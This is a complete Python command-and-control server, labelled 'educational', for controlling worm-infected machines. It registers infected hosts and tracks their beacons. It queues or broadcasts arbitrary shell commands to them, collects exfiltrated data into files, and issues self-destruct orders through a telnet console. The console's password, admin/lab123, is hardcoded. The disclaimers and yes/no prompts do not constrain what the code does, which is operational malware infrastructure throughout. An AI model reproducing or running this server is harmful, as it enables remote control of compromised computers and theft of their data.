#!/usr/bin/env python3
"""
Educational C2 Server - Cybersecurity Research Tool
==================================================
ETHICAL DISCLAIMER: This tool is for authorized testing only. Misuse is prohibited.

Advanced Command & Control server for educational worm testing in controlled
lab environments. Provides telnet interface for real-time control and monitoring.

WARNING: Only use in isolated lab environments with proper authorization.
"""

import socket
import threading
import time
import json
import logging
import sqlite3
import hashlib
import base64
from datetime import datetime, timedelta
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import ssl
import os
import sys
import subprocess
import random
import string

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - [%(threadName)s] - %(message)s',
    handlers=[
        logging.FileHandler('c2_server.log'),
        logging.StreamHandler()
    ]
)

class C2Database:
    """Database management for C2 operations"""
    
    def __init__(self, db_path='c2_database.db'):
        self.db_path = db_path
        self.init_database()
    
    def init_database(self):
        """Initialize C2 database tables"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        # Infected hosts table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS infected_hosts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                worm_id TEXT UNIQUE,
                hostname TEXT,
                ip_address TEXT,
                first_seen TIMESTAMP,
                last_seen TIMESTAMP,
                status TEXT,
                persistence_methods TEXT,
                collected_data TEXT
            )
        ''')
        
        # Commands table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                worm_id TEXT,
                command TEXT,
                timestamp TIMESTAMP,
                status TEXT,
                result TEXT
            )
        ''')
        
        # Logs table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TIMESTAMP,
                level TEXT,
                source TEXT,
                message TEXT
            )
        ''')
        
        conn.commit()
        conn.close()
        logging.info("C2 database initialized")
    
    def register_host(self, worm_data):
        """Register new infected host"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        try:
            cursor.execute('''
                INSERT OR REPLACE INTO infected_hosts 
                (worm_id, hostname, ip_address, first_seen, last_seen, status, persistence_methods)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            ''', (
                worm_data['worm_id'],
                worm_data.get('hostname', 'Unknown'),
                worm_data.get('ip_address', 'Unknown'),
                datetime.now(),
                datetime.now(),
                'active',
                json.dumps(worm_data.get('persistence_methods', []))
            ))
            conn.commit()
            logging.info(f"Registered host: {worm_data['worm_id']}")
        except Exception as e:
            logging.error(f"Database registration error: {e}")
        finally:
            conn.close()
    
    def update_host_beacon(self, worm_id):
        """Update last seen timestamp for host"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        try:
            cursor.execute('''
                UPDATE infected_hosts 
                SET last_seen = ? 
                WHERE worm_id = ?
            ''', (datetime.now(), worm_id))
            conn.commit()
        except Exception as e:
            logging.error(f"Database beacon update error: {e}")
        finally:
            conn.close()
    
    def get_all_hosts(self):
        """Get all infected hosts"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        try:
            cursor.execute('SELECT * FROM infected_hosts ORDER BY last_seen DESC')
            hosts = cursor.fetchall()
            return hosts
        except Exception as e:
            logging.error(f"Database query error: {e}")
            return []
        finally:
            conn.close()
    
    def add_command(self, worm_id, command):
        """Add command for specific worm"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        try:
            cursor.execute('''
                INSERT INTO commands (worm_id, command, timestamp, status)
                VALUES (?, ?, ?, ?)
            ''', (worm_id, command, datetime.now(), 'pending'))
            conn.commit()
            logging.info(f"Command queued for {worm_id}: {command}")
        except Exception as e:
            logging.error(f"Command queue error: {e}")
        finally:
            conn.close()
    
    def get_pending_commands(self, worm_id):
        """Get pending commands for worm"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        try:
            cursor.execute('''
                SELECT id, command FROM commands 
                WHERE worm_id = ? AND status = 'pending'
                ORDER BY timestamp ASC
            ''', (worm_id,))
            commands = cursor.fetchall()
            
            # Mark as sent
            if commands:
                command_ids = [str(cmd[0]) for cmd in commands]
                cursor.execute(f'''
                    UPDATE commands 
                    SET status = 'sent' 
                    WHERE id IN ({','.join(['?'] * len(command_ids))})
                ''', command_ids)
                conn.commit()
            
            return [cmd[1] for cmd in commands]
        except Exception as e:
            logging.error(f"Command retrieval error: {e}")
            return []
        finally:
            conn.close()

class C2HTTPHandler(BaseHTTPRequestHandler):
    """HTTP handler for worm communications"""
    
    def __init__(self, *args, c2_server=None, **kwargs):
        self.c2_server = c2_server
        super().__init__(*args, **kwargs)
    
    def do_POST(self):
        """Handle POST requests from worms"""
        try:
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data.decode('utf-8'))
            
            if self.path == '/beacon':
                self.handle_beacon(data)
            elif self.path == '/register':
                self.handle_registration(data)
            elif self.path == '/data':
                self.handle_data_exfiltration(data)
            else:
                self.send_error(404)
                
        except Exception as e:
            logging.error(f"HTTP handler error: {e}")
            self.send_error(500)
    
    def handle_beacon(self, data):
        """Handle beacon from worm"""
        worm_id = data.get('worm_id')
        if worm_id:
            self.c2_server.db.update_host_beacon(worm_id)
            
            # Get pending commands
            commands = self.c2_server.db.get_pending_commands(worm_id)
            
            response = {
                'status': 'ok',
                'commands': commands,
                'timestamp': datetime.now().isoformat()
            }
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(response).encode())
            
            # Notify telnet clients
            if commands:
                self.c2_server.broadcast_to_telnet(f"Commands sent to {worm_id}: {commands}")
        else:
            self.send_error(400)
    
    def handle_registration(self, data):
        """Handle new worm registration"""
        self.c2_server.db.register_host(data)
        
        response = {
            'status': 'registered',
            'worm_id': data.get('worm_id'),
            'timestamp': datetime.now().isoformat()
        }
        
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(response).encode())
        
        # Notify telnet clients
        self.c2_server.broadcast_to_telnet(f"New worm registered: {data.get('worm_id')} from {data.get('ip_address')}")
    
    def handle_data_exfiltration(self, data):
        """Handle data exfiltration from worms"""
        worm_id = data.get('worm_id')
        exfil_data = data.get('data')
        
        if worm_id and exfil_data:
            # Store exfiltrated data
            filename = f"exfil_{worm_id}_{int(time.time())}.json"
            with open(filename, 'w') as f:
                json.dump(exfil_data, f, indent=2)
            
            logging.info(f"Data exfiltrated from {worm_id}: {filename}")
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'status': 'received'}).encode())
            
            # Notify telnet clients
            self.c2_server.broadcast_to_telnet(f"Data exfiltrated from {worm_id}: {len(str(exfil_data))} bytes")
        else:
            self.send_error(400)
    
    def log_message(self, format, *args):
        """Override to use our logging"""
        logging.info(f"HTTP: {format % args}")

class TelnetHandler:
    """Telnet interface handler for C2 operations"""
    
    def __init__(self, client_socket, c2_server):
        self.client_socket = client_socket
        self.c2_server = c2_server
        self.authenticated = False
        self.username = None
        
    def send_message(self, message):
        """Send message to telnet client"""
        try:
            self.client_socket.send(f"{message}\r\n".encode())
        except:
            pass
    
    def authenticate(self):
        """Simple authentication for telnet access"""
        self.send_message("=== C2 SERVER TELNET INTERFACE ===")
        self.send_message("ETHICAL DISCLAIMER: Authorized testing only")
        self.send_message("Enter credentials for C2 access:")
        
        # Simple auth (in real scenario, use proper authentication)
        self.send_message("Username: ")
        username = self.receive_input().strip()
        
        self.send_message("Password: ")
        password = self.receive_input().strip()
        
        # Default credentials for lab
        if username == "admin" and password == "lab123":
            self.authenticated = True
            self.username = username
            self.send_message("Authentication successful!")
            return True
        else:
            self.send_message("Authentication failed!")
            return False
    
    def receive_input(self):
        """Receive input from telnet client"""
        try:
            data = self.client_socket.recv(1024).decode().strip()
            return data
        except:
            return ""
    
    def show_banner(self):
        """Display C2 banner"""
        banner = """
╔══════════════════════════════════════════════════════════════╗
║                    EDUCATIONAL C2 SERVER                     ║
║                  Cybersecurity Research Tool                 ║
║                                                              ║
║  ETHICAL DISCLAIMER: For authorized testing only            ║
║  Misuse is prohibited and may violate laws                  ║
╚══════════════════════════════════════════════════════════════╝

Available Commands:
  help                 - Show this help menu
  status               - Show C2 server status
  hosts                - List all infected hosts
  host <id>            - Show detailed host information
  cmd <id> <command>   - Send command to specific host
  broadcast <command>  - Send command to all hosts
  logs                 - Show recent logs
  stats                - Show infection statistics
  kill <id>            - Send self-destruct to specific host
  killall              - Send self-destruct to all hosts
  exit                 - Disconnect from C2 server

Type 'help' for command details.
"""
        self.send_message(banner)
    
    def handle_commands(self):
        """Main command handling loop"""
        if not self.authenticate():
            return
        
        self.show_banner()
        self.send_message(f"Welcome {self.username}! C2 Server ready.")
        
        while True:
            try:
                self.send_message("\nC2> ")
                command = self.receive_input().strip().lower()
                
                if not command:
                    continue
                
                if command == "exit" or command == "quit":
                    self.send_message("Disconnecting from C2 server...")
                    break
                elif command == "help":
                    self.show_help()
                elif command == "status":
                    self.show_status()
                elif command == "hosts":
                    self.show_hosts()
                elif command.startswith("host "):
                    self.show_host_details(command[5:])
                elif command.startswith("cmd "):
                    self.send_command(command[4:])
                elif command.startswith("broadcast "):
                    self.broadcast_command(command[10:])
                elif command == "logs":
                    self.show_logs()
                elif command == "stats":
                    self.show_stats()
                elif command.startswith("kill "):
                    self.kill_host(command[5:])
                elif command == "killall":
                    self.kill_all_hosts()
                elif command == "clear":
                    self.send_message("\033[2J\033[H")  # Clear screen
                else:
                    self.send_message(f"Unknown command: {command}")
                    self.send_message("Type 'help' for available commands")
                    
            except Exception as e:
                logging.error(f"Telnet command error: {e}")
                break
    
    def show_help(self):
        """Show detailed help"""
        help_text = """
COMMAND DETAILS:

Basic Commands:
  status               - Show C2 server uptime, connections, etc.
  hosts                - List all infected hosts with basic info
  logs                 - Show last 20 log entries
  stats                - Show infection and command statistics

Host Management:
  host <worm_id>       - Show detailed information for specific host
  cmd <worm_id> <cmd>  - Send shell command to specific host
  broadcast <command>  - Send command to all active hosts
  kill <worm_id>       - Send self-destruct command to specific host
  killall              - Send self-destruct to all hosts (DANGEROUS!)

Examples:
  hosts                          - List all infected machines
  host abc123def                 - Show details for worm ID abc123def
  cmd abc123def whoami           - Execute 'whoami' on specific host
  broadcast exec:systeminfo      - Get system info from all hosts
  kill abc123def                 - Self-destruct specific worm
"""
        self.send_message(help_text)
    
    def show_status(self):
        """Show C2 server status"""
        uptime = datetime.now() - self.c2_server.start_time
        hosts = self.c2_server.db.get_all_hosts()
        active_hosts = [h for h in hosts if self.is_host_active(h[6])]  # last_seen column
        
        status = f"""
C2 SERVER STATUS:
  Uptime: {uptime}
  Total Hosts: {len(hosts)}
  Active Hosts: {len(active_hosts)}
  HTTP Port: {self.c2_server.http_port}
  Telnet Port: {self.c2_server.telnet_port}
  Database: {self.c2_server.db.db_path}
  Log File: c2_server.log
"""
        self.send_message(status)
    
    def show_hosts(self):
        """Show all infected hosts"""
        hosts = self.c2_server.db.get_all_hosts()
        
        if not hosts:
            self.send_message("No infected hosts registered")
            return
        
        self.send_message("\nINFECTED HOSTS:")
        self.send_message("-" * 80)
        self.send_message(f"{'Worm ID':<12} {'Hostname':<15} {'IP Address':<15} {'Last Seen':<20} {'Status'}")
        self.send_message("-" * 80)
        
        for host in hosts:
            worm_id = host[1][:12]  # Truncate for display
            hostname = host[2][:15] if host[2] else "Unknown"
            ip_addr = host[3][:15] if host[3] else "Unknown"
            last_seen = host[5][:19] if host[5] else "Never"
            status = "ACTIVE" if self.is_host_active(host[5]) else "INACTIVE"
            
            self.send_message(f"{worm_id:<12} {hostname:<15} {ip_addr:<15} {last_seen:<20} {status}")
    
    def show_host_details(self, worm_id):
        """Show detailed host information"""
        hosts = self.c2_server.db.get_all_hosts()
        target_host = None
        
        for host in hosts:
            if host[1].startswith(worm_id):
                target_host = host
                break
        
        if not target_host:
            self.send_message(f"Host not found: {worm_id}")
            return
        
        persistence = json.loads(target_host[7]) if target_host[7] else []
        
        details = f"""
HOST DETAILS:
  Worm ID: {target_host[1]}
  Hostname: {target_host[2]}
  IP Address: {target_host[3]}
  First Seen: {target_host[4]}
  Last Seen: {target_host[5]}
  Status: {target_host[6]}
  Persistence Methods: {', '.join(persistence) if persistence else 'None'}
  
  Activity Status: {'ACTIVE' if self.is_host_active(target_host[5]) else 'INACTIVE'}
"""
        self.send_message(details)
    
    def send_command(self, command_line):
        """Send command to specific host"""
        parts = command_line.split(' ', 1)
        if len(parts) < 2:
            self.send_message("Usage: cmd <worm_id> <command>")
            return
        
        worm_id_partial, command = parts
        
        # Find full worm ID
        hosts = self.c2_server.db.get_all_hosts()
        target_worm_id = None
        
        for host in hosts:
            if host[1].startswith(worm_id_partial):
                target_worm_id = host[1]
                break
        
        if not target_worm_id:
            self.send_message(f"Host not found: {worm_id_partial}")
            return
        
        # Queue command
        full_command = f"exec:{command}"
        self.c2_server.db.add_command(target_worm_id, full_command)
        self.send_message(f"Command queued for {target_worm_id}: {command}")
    
    def broadcast_command(self, command):
        """Send command to all active hosts"""
        hosts = self.c2_server.db.get_all_hosts()
        active_hosts = [h for h in hosts if self.is_host_active(h[5])]
        
        if not active_hosts:
            self.send_message("No active hosts to broadcast to")
            return
        
        full_command = f"exec:{command}"
        count = 0
        
        for host in active_hosts:
            self.c2_server.db.add_command(host[1], full_command)
            count += 1
        
        self.send_message(f"Command broadcasted to {count} active hosts: {command}")
    
    def show_logs(self):
        """Show recent logs"""
        try:
            with open('c2_server.log', 'r') as f:
                lines = f.readlines()
                recent_lines = lines[-20:] if len(lines) > 20 else lines
                
            self.send_message("\nRECENT LOGS (Last 20 entries):")
            self.send_message("-" * 80)
            for line in recent_lines:
                self.send_message(line.strip())
        except Exception as e:
            self.send_message(f"Error reading logs: {e}")
    
    def show_stats(self):
        """Show infection statistics"""
        hosts = self.c2_server.db.get_all_hosts()
        active_hosts = [h for h in hosts if self.is_host_active(h[5])]
        
        # Calculate stats
        total_hosts = len(hosts)
        active_count = len(active_hosts)
        inactive_count = total_hosts - active_count
        
        # Get command stats
        conn = sqlite3.connect(self.c2_server.db.db_path)
        cursor = conn.cursor()
        cursor.execute('SELECT COUNT(*) FROM commands')
        total_commands = cursor.fetchone()[0]
        cursor.execute('SELECT COUNT(*) FROM commands WHERE status = "pending"')
        pending_commands = cursor.fetchone()[0]
        conn.close()
        
        stats = f"""
INFECTION STATISTICS:
  Total Infected Hosts: {total_hosts}
  Active Hosts: {active_count}
  Inactive Hosts: {inactive_count}
  
COMMAND STATISTICS:
  Total Commands Sent: {total_commands}
  Pending Commands: {pending_commands}
  
SERVER STATISTICS:
  Uptime: {datetime.now() - self.c2_server.start_time}
  Telnet Connections: {len(self.c2_server.telnet_clients)}
"""
        self.send_message(stats)
    
    def kill_host(self, worm_id_partial):
        """Send self-destruct to specific host"""
        hosts = self.c2_server.db.get_all_hosts()
        target_worm_id = None
        
        for host in hosts:
            if host[1].startswith(worm_id_partial):
                target_worm_id = host[1]
                break
        
        if not target_worm_id:
            self.send_message(f"Host not found: {worm_id_partial}")
            return
        
        self.send_message(f"WARNING: Sending self-destruct to {target_worm_id}")
        self.send_message("Type 'CONFIRM' to proceed: ")
        confirmation = self.receive_input().strip()
        
        if confirmation == "CONFIRM":
            self.c2_server.db.add_command(target_worm_id, "self_destruct")
            self.send_message(f"Self-destruct command sent to {target_worm_id}")
        else:
            self.send_message("Self-destruct cancelled")
    
    def kill_all_hosts(self):
        """Send self-destruct to all hosts"""
        hosts = self.c2_server.db.get_all_hosts()
        
        if not hosts:
            self.send_message("No hosts to destroy")
            return
        
        self.send_message(f"WARNING: This will send self-destruct to ALL {len(hosts)} hosts!")
        self.send_message("Type 'DESTROY ALL' to confirm: ")
        confirmation = self.receive_input().strip()
        
        if confirmation == "DESTROY ALL":
            count = 0
            for host in hosts:
                self.c2_server.db.add_command(host[1], "self_destruct")
                count += 1
            
            self.send_message(f"Self-destruct sent to {count} hosts")
        else:
            self.send_message("Mass destruction cancelled")
    
    def is_host_active(self, last_seen_str):
        """Check if host is considered active"""
        if not last_seen_str:
            return False
        
        try:
            last_seen = datetime.fromisoformat(last_seen_str.replace(' ', 'T'))
            return (datetime.now() - last_seen) < timedelta(minutes=5)
        except:
            return False

class EducationalC2Server:
    """Main C2 Server class"""
    
    def __init__(self, http_port=8080, telnet_port=9999):
        self.http_port = http_port
        self.telnet_port = telnet_port
        self.start_time = datetime.now()
        self.running = True
        self.telnet_clients = []
        
        # Initialize database
        self.db = C2Database()
        
        logging.info("=== EDUCATIONAL C2 SERVER INITIALIZED ===")
        logging.info(f"HTTP Port: {http_port}")
        logging.info(f"Telnet Port: {telnet_port}")
    
    def start_http_server(self):
        """Start HTTP server for worm communications"""
        def handler(*args, **kwargs):
            return C2HTTPHandler(*args, c2_server=self, **kwargs)
        
        try:
            self.http_server = HTTPServer(('0.0.0.0', self.http_port), handler)
            logging.info(f"HTTP server started on port {self.http_port}")
            self.http_server.serve_forever()
        except Exception as e:
            logging.error(f"HTTP server error: {e}")
    
    def start_telnet_server(self):
        """Start telnet server for operator interface"""
        try:
            telnet_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            telnet_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            telnet_socket.bind(('0.0.0.0', self.telnet_port))
            telnet_socket.listen(5)
            
            logging.info(f"Telnet server started on port {self.telnet_port}")
            
            while self.running:
                try:
                    client_socket, address = telnet_socket.accept()
                    logging.info(f"Telnet connection from {address}")
                    
                    # Handle client in separate thread
                    client_thread = threading.Thread(
                        target=self.handle_telnet_client,
                        args=(client_socket, address)
                    )
                    client_thread.daemon = True
                    client_thread.start()
                    
                except Exception as e:
                    if self.running:
                        logging.error(f"Telnet accept error: {e}")
                        
        except Exception as e:
            logging.error(f"Telnet server error: {e}")
    
    def handle_telnet_client(self, client_socket, address):
        """Handle individual telnet client"""
        handler = TelnetHandler(client_socket, self)
        self.telnet_clients.append(handler)
        
        try:
            handler.handle_commands()
        except Exception as e:
            logging.error(f"Telnet client error: {e}")
        finally:
            if handler in self.telnet_clients:
                self.telnet_clients.remove(handler)
            client_socket.close()
            logging.info(f"Telnet client {address} disconnected")
    
    def broadcast_to_telnet(self, message):
        """Broadcast message to all telnet clients"""
        for client in self.telnet_clients[:]:  # Copy list to avoid modification during iteration
            try:
                client.send_message(f"[ALERT] {message}")
            except:
                # Remove disconnected clients
                if client in self.telnet_clients:
                    self.telnet_clients.remove(client)
    
    def start_server(self):
        """Start both HTTP and Telnet servers"""
        logging.info("Starting C2 server components...")
        
        # Start HTTP server in separate thread
        http_thread = threading.Thread(target=self.start_http_server)
        http_thread.daemon = True
        http_thread.start()
        
        # Start telnet server in main thread
        try:
            self.start_telnet_server()
        except KeyboardInterrupt:
            logging.info("C2 server shutdown requested")
            self.shutdown()
    
    def shutdown(self):
        """Shutdown C2 server"""
        logging.info("Shutting down C2 server...")
        self.running = False
        
        # Close telnet clients
        for client in self.telnet_clients:
            try:
                client.client_socket.close()
            except:
                pass
        
        # Shutdown HTTP server
        if hasattr(self, 'http_server'):
            self.http_server.shutdown()
        
        logging.info("C2 server shutdown complete")

def main():
    """
    Main function with safety checks
    """
    print("="*80)
    print("EDUCATIONAL C2 SERVER - CYBERSECURITY RESEARCH TOOL")
    print("="*80)
    print("ETHICAL DISCLAIMER: This tool is for authorized testing only. Misuse is prohibited.")
    print("Advanced Command & Control server for educational worm testing")
    print("in controlled lab environments with proper authorization.")
    print("="*80)
    
    # Safety confirmations
    print("\nSAFETY VERIFICATION:")
    print("1. Confirm this is a controlled lab environment")
    print("2. Confirm you have proper authorization")
    print("3. Confirm this is for educational/research purposes only")
    
    confirmations = []
    confirmations.append(input("\nConfirm controlled lab environment (yes/no): ").lower() == 'yes')
    confirmations.append(input("Confirm proper authorization (yes/no): ").lower() == 'yes')
    confirmations.append(input("Confirm educational purpose only (yes/no): ").lower() == 'yes')
    
    if not all(confirmations):
        print("All safety confirmations required. Exiting.")
        return
    
    # Port configuration
    http_port = int(input("HTTP port for worm communications (default 8080): ") or "8080")
    telnet_port = int(input("Telnet port for operator interface (default 9999): ") or "9999")
    
    print(f"\nStarting C2 server...")
    print(f"HTTP Server: http://localhost:{http_port}")
    print(f"Telnet Interface: telnet localhost {telnet_port}")
    print(f"Default telnet credentials: admin/lab123")
    print("\nPress Ctrl+C to shutdown server")
    
    # Initialize and start C2 server
    c2_server = EducationalC2Server(http_port, telnet_port)
    c2_server.start_server()

if __name__ == "__main__":
    main() 